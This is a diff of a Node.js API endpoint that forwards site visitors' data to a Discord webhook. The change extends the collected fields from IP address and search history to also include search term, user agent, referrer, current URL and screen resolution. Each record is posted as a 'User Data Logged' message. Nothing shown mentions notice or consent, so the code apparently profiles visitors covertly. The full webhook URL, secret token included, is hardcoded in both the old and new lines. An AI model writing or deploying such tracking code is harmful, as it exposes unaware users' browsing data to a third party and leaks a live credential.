@@ -2,22 +2,29 @@ import fetch from 'node-fetch';
 
 export default async (req, res) => {
     if (req.method === 'POST') {
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT'; // Replace with your Discord webhook URL
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT';
 
         try {
-            const { ip, searchHistory } = req.body;
+            const { ip, searchTerm, userAgent, referrer, currentURL, screenWidth, screenHeight } = req.body;
 
-            // Check if IP and searchHistory are defined
-            if (!ip || !searchHistory) {
-                return res.status(400).json({ message: 'IP address or search history is missing.' });
+            // Check if required data is defined
+            if (!ip || !searchTerm || !userAgent) {
+                return res.status(400).json({ message: 'Missing required data.' });
             }
 
-            // Send the private IP and search history to Discord
+            // Send the collected information to Discord
             const logMessage = {
                 embeds: [
                     {
                         title: 'User Data Logged',
-                        description: `**Private IP:** \`${ip}\`\n**Search History:** \`${searchHistory}\``,
+                        description: `
+                            **Private IP:** \`${ip}\`
+                            **Search Term:** \`${searchTerm}\`
+                            **User Agent:** \`${userAgent}\`
+                            **Referrer URL:** \`${referrer}\`
+                            **Current URL:** \`${currentURL}\`
+                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
+                        `,
                         color: 0xFF0000, // Red color
                         timestamp: new Date(),
                     },
@@ -36,7 +43,7 @@ export default async (req, res) => {
                 return res.status(500).json({ message: 'Error sending to Discord' });
             }
 
-            res.status(200).json({ message: 'IP and search history logged successfully' });
+            res.status(200).json({ message: 'User data logged successfully' });
         } catch (error) {
             console.error('Error occurred:', error);
             res.status(500).json({ message: 'Error processing request' });
